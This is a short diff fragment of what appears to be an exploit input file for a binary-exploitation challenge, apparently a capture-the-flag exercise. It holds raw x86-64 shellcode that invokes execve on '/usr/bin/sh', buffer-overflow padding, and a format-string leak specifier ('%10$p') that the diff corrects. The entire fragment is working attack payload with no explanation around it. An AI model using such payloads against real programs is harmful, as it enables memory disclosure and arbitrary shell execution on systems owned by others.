@@ -42,7 +42,7 @@ so:
 
 \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\n
 3\nAAAABBBBCCCCDDDD/usr/bin/sh\x00\n
-2\n%%10\$p\n
+2\n%10$p\n
 4\nn\n
 3\nAAAABBBBCCCCDDDDEEEEFFFF[&name]
 2\n
